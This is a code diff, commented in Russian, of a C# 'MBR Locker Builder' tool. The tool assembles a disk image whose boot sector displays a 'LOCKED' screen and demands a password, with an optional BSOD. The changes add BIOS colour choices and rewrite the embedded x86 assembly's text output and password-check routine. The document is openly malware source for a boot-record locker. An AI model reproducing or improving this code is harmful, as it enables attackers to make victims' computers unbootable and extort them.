@@ -29,6 +29,40 @@ namespace MbrLockerBuilder
         private Label lblStatus;
         private SaveFileDialog saveFileDialog;
 
+        // Цвета для текста (BIOS атрибуты)
+        private readonly Dictionary<string, string> textColorMap = new Dictionary<string, string>
+        {
+            { "Black", "00" },
+            { "Blue", "01" },
+            { "Green", "02" },
+            { "Cyan", "03" },
+            { "Red", "04" },
+            { "Magenta", "05" },
+            { "Brown", "06" },
+            { "Light Gray", "07" },
+            { "Dark Gray", "08" },
+            { "Light Blue", "09" },
+            { "Light Green", "0A" },
+            { "Light Cyan", "0B" },
+            { "Light Red", "0C" },
+            { "Light Magenta", "0D" },
+            { "Yellow", "0E" },
+            { "White", "0F" },
+        };
+
+        // Цвета для фона (BIOS атрибуты)
+        private readonly Dictionary<string, string> bgColorMap = new Dictionary<string, string>
+        {
+            { "Black", "00" },
+            { "Blue", "10" },
+            { "Green", "20" },
+            { "Cyan", "30" },
+            { "Red", "40" },
+            { "Magenta", "50" },
+            { "Brown", "60" },
+            { "Light Gray", "70" },
+        };
+
         public MainForm()
         {
             this.Text = "MBR Locker Builder";
@@ -125,34 +159,34 @@ namespace MbrLockerBuilder
             this.cmbTextColor = new ComboBox();
             this.cmbTextColor.Left = leftControl;
             this.cmbTextColor.Top = y;
-            this.cmbTextColor.Width = 120;
+            this.cmbTextColor.Width = 150;
             this.cmbTextColor.BackColor = Color.FromArgb(20, 25, 20);
             this.cmbTextColor.ForeColor = Color.FromArgb(0, 255, 100);
             this.cmbTextColor.DropDownStyle = ComboBoxStyle.DropDownList;
             this.cmbTextColor.Font = new Font("Consolas", 10);
-            this.cmbTextColor.Items.AddRange(new object[] { "Lime", "Red", "White", "Cyan", "Yellow", "Magenta" });
-            this.cmbTextColor.SelectedIndex = 0;
+            this.cmbTextColor.Items.AddRange(new object[] { "Black", "Blue", "Green", "Cyan", "Red", "Magenta", "Brown", "Light Gray", "Dark Gray", "Light Blue", "Light Green", "Light Cyan", "Light Red", "Light Magenta", "Yellow", "White" });
+            this.cmbTextColor.SelectedIndex = 15; // White
             this.Controls.Add(this.cmbTextColor);
 
             Label lblBgColor = new Label();
-            lblBgColor.Text = "Фон:";
-            lblBgColor.Left = leftControl + 140;
+            lblBgColor.Text = "Цвет фона:";
+            lblBgColor.Left = leftControl + 170;
             lblBgColor.Top = y;
-            lblBgColor.Width = 50;
+            lblBgColor.Width = 100;
             lblBgColor.ForeColor = Color.FromArgb(0, 255, 100);
             lblBgColor.Font = new Font("Consolas", 10, FontStyle.Bold);
             this.Controls.Add(lblBgColor);
 
             this.cmbBgColor = new ComboBox();
-            this.cmbBgColor.Left = leftControl + 190;
+            this.cmbBgColor.Left = leftControl + 270;
             this.cmbBgColor.Top = y;
-            this.cmbBgColor.Width = 120;
+            this.cmbBgColor.Width = 130;
             this.cmbBgColor.BackColor = Color.FromArgb(20, 25, 20);
             this.cmbBgColor.ForeColor = Color.FromArgb(0, 255, 100);
             this.cmbBgColor.DropDownStyle = ComboBoxStyle.DropDownList;
             this.cmbBgColor.Font = new Font("Consolas", 10);
-            this.cmbBgColor.Items.AddRange(new object[] { "Black", "Blue", "Dark Red", "Dark Green" });
-            this.cmbBgColor.SelectedIndex = 0;
+            this.cmbBgColor.Items.AddRange(new object[] { "Black", "Blue", "Green", "Cyan", "Red", "Magenta", "Brown", "Light Gray" });
+            this.cmbBgColor.SelectedIndex = 0; // Black
             this.Controls.Add(this.cmbBgColor);
             y += 45;
 
@@ -244,22 +278,36 @@ namespace MbrLockerBuilder
                 {
                     case 0: bgColor = Color.Black; break;
                     case 1: bgColor = Color.DarkBlue; break;
-                    case 2: bgColor = Color.Maroon; break;
-                    case 3: bgColor = Color.DarkGreen; break;
+                    case 2: bgColor = Color.DarkGreen; break;
+                    case 3: bgColor = Color.DarkCyan; break;
+                    case 4: bgColor = Color.DarkRed; break;
+                    case 5: bgColor = Color.DarkMagenta; break;
+                    case 6: bgColor = Color.Olive; break;
+                    case 7: bgColor = Color.LightGray; break;
                 }
                 g.Clear(bgColor);
 
                 g.DrawRectangle(new Pen(Color.FromArgb(80, 80, 80), 1), 5, 5, 630, 230);
 
-                Color fgColor = Color.Lime;
+                Color fgColor = Color.White;
                 switch (this.cmbTextColor.SelectedIndex)
                 {
-                    case 0: fgColor = Color.Lime; break;
-                    case 1: fgColor = Color.Red; break;
-                    case 2: fgColor = Color.White; break;
+                    case 0: fgColor = Color.Black; break;
+                    case 1: fgColor = Color.Blue; break;
+                    case 2: fgColor = Color.Green; break;
                     case 3: fgColor = Color.Cyan; break;
-                    case 4: fgColor = Color.Yellow; break;
+                    case 4: fgColor = Color.Red; break;
                     case 5: fgColor = Color.Magenta; break;
+                    case 6: fgColor = Color.Brown; break;
+                    case 7: fgColor = Color.LightGray; break;
+                    case 8: fgColor = Color.DarkGray; break;
+                    case 9: fgColor = Color.LightBlue; break;
+                    case 10: fgColor = Color.LightGreen; break;
+                    case 11: fgColor = Color.LightCyan; break;
+                    case 12: fgColor = Color.LightRed; break;
+                    case 13: fgColor = Color.LightMagenta; break;
+                    case 14: fgColor = Color.Yellow; break;
+                    case 15: fgColor = Color.White; break;
                 }
 
                 using (Font font = new Font("Consolas", 11, FontStyle.Regular))
@@ -433,20 +481,16 @@ namespace MbrLockerBuilder
                 this.lblStatus.Text = "3/7 Компиляция Stage2...";
                 Application.DoEvents();
 
-                // Stage2 больше не нужен — он встроен в MBR
                 byte[] stage2Bytes = new byte[0];
 
                 this.lblStatus.Text = "4/7 Сборка образа...";
                 Application.DoEvents();
 
-                // СТРУКТУРА: 16 секторов, шрифт 8 секторов (4096 байт)
                 int totalSectors = 16;
                 byte[] fullImage = new byte[512 * totalSectors];
 
-                // 1. MBR (сектор 0) — содержит весь код
                 Array.Copy(mbrBytes, 0, fullImage, 0, 512);
 
-                // 2. Шрифт (сектора 3-10) — 8 секторов = 4096 байт
                 byte[] fontData = GenerateCP866Font();
                 if (fontData != null && fontData.Length >= 4096)
                 {
@@ -458,7 +502,6 @@ namespace MbrLockerBuilder
                     return;
                 }
 
-                // 3. Заголовок (сектор 11)
                 string title = this.txtTitle.Text.Trim();
                 if (string.IsNullOrEmpty(title)) title = "LOCKED";
                 string border = "========================================\r\n";
@@ -468,7 +511,6 @@ namespace MbrLockerBuilder
                 if (titleBytes.Length > 512) Array.Resize(ref titleBytes, 512);
                 Array.Copy(titleBytes, 0, fullImage, 512 * 11, titleBytes.Length);
 
-                // 4. Текст (сектор 12)
                 string body = this.txtBody.Text.Trim();
                 if (string.IsNullOrEmpty(body)) body = "Computer is locked.";
                 string formattedBody = body.Replace("\n", "\r\n");
@@ -617,7 +659,7 @@ start:
 
     mov ah, 0x06
     mov al, 0
-    mov bh, 0x00
+    mov bh, 0x07
     mov cx, 0
     mov dx, 0x184F
     int 0x10
@@ -635,10 +677,13 @@ start:
     jc load_error
 
     mov ax, 0x1100
-    mov bx, 0x0100
-    int 0x10
-
-    mov ax, 0x0F00
+    mov bx, 0x1000
+    mov cx, 256
+    mov dx, 0
+    mov ax, 0x0000
+    mov es, ax
+    mov bp, 0x1000
+    mov ax, 0x1100
     int 0x10
 
     mov ax, 0x0000
@@ -745,6 +790,8 @@ print:
     or al, al
     jz .done
     mov ah, 0x0E
+    mov bh, 0
+    mov bl, 0x07
     int 0x10
     jmp print
 .done:
@@ -766,6 +813,8 @@ get_password:
     je .loop
     stosb
     mov ah, 0x0E
+    mov bh, 0
+    mov bl, 0x07
     mov al, [di - 1]
     int 0x10
     jmp .loop
@@ -774,6 +823,8 @@ get_password:
     je .loop
     dec di
     mov ah, 0x0E
+    mov bh, 0
+    mov bl, 0x07
     mov al, 0x08
     int 0x10
     mov al, ' '
@@ -784,6 +835,8 @@ get_password:
 .done:
     mov byte [di], 0
     mov ah, 0x0E
+    mov bh, 0
+    mov bl, 0x07
     mov al, 0x0A
     int 0x10
     mov al, 0x0D
@@ -795,16 +848,18 @@ check_password:
     mov di, password
 .compare:
     lodsb
+    mov bl, [di]
+    cmp al, bl
+    jne .fail
+    inc di
     or al, al
-    jz .check_end
-    cmpsb
-    jne .fail
+    jz .success
     jmp .compare
-.check_end:
-    cmp byte [di], 0
-    jne .fail
-    mov byte [password_ok], 1
 .fail:
+    mov byte [password_ok], 0
+    ret
+.success:
+    mov byte [password_ok], 1
     ret
 
 hang:
@@ -852,30 +907,47 @@ dw 0xAA55";
             template = template.Replace("{PASSWORD_HEX}", passwordHex + ", 0x00");
 
             // ============================================================
-            // ЗАМЕНА ЦВЕТОВ
+            // ЗАМЕНА ЦВЕТОВ (ИЗ РАСШИРЕННОГО СПИСКА)
             // ============================================================
-            string textColor = "0A";
+            string textColor = "0F"; // White (по умолчанию)
             switch (this.cmbTextColor.SelectedIndex)
             {
-                case 0: textColor = "0A"; break;
-                case 1: textColor = "0C"; break;
-                case 2: textColor = "0F"; break;
-                case 3: textColor = "0B"; break;
-                case 4: textColor = "0E"; break;
-                case 5: textColor = "0D"; break;
+                case 0: textColor = "00"; break; // Black
+                case 1: textColor = "01"; break; // Blue
+                case 2: textColor = "02"; break; // Green
+                case 3: textColor = "03"; break; // Cyan
+                case 4: textColor = "04"; break; // Red
+                case 5: textColor = "05"; break; // Magenta
+                case 6: textColor = "06"; break; // Brown
+                case 7: textColor = "07"; break; // Light Gray
+                case 8: textColor = "08"; break; // Dark Gray
+                case 9: textColor = "09"; break; // Light Blue
+                case 10: textColor = "0A"; break; // Light Green
+                case 11: textColor = "0B"; break; // Light Cyan
+                case 12: textColor = "0C"; break; // Light Red
+                case 13: textColor = "0D"; break; // Light Magenta
+                case 14: textColor = "0E"; break; // Yellow
+                case 15: textColor = "0F"; break; // White
             }
 
-            string bgColor = "00";
+            string bgColor = "00"; // Black (по умолчанию)
             switch (this.cmbBgColor.SelectedIndex)
             {
-                case 0: bgColor = "00"; break;
-                case 1: bgColor = "10"; break;
-                case 2: bgColor = "40"; break;
-                case 3: bgColor = "20"; break;
+                case 0: bgColor = "00"; break; // Black
+                case 1: bgColor = "10"; break; // Blue
+                case 2: bgColor = "20"; break; // Green
+                case 3: bgColor = "30"; break; // Cyan
+                case 4: bgColor = "40"; break; // Red
+                case 5: bgColor = "50"; break; // Magenta
+                case 6: bgColor = "60"; break; // Brown
+                case 7: bgColor = "70"; break; // Light Gray
             }
 
-            template = template.Replace("mov bh, 0x00", "mov bh, 0x" + bgColor);
-            template = template.Replace("mov ax, 0x0A00", "mov ax, 0x" + textColor + "00");
+            // Комбинированный цвет (фон + текст)
+            string combinedColor = bgColor + textColor;
+
+            template = template.Replace("mov bh, 0x07", "mov bh, 0x" + combinedColor);
+            template = template.Replace("mov bl, 0x07", "mov bl, 0x" + textColor);
 
             // BSOD
             bool enableBSOD = this.chkBSOD.Checked;
@@ -889,7 +961,6 @@ dw 0xAA55";
 
         private string GenerateStage2()
         {
-            // Stage2 больше не нужен — он встроен в MBR
             return "";
         }
 
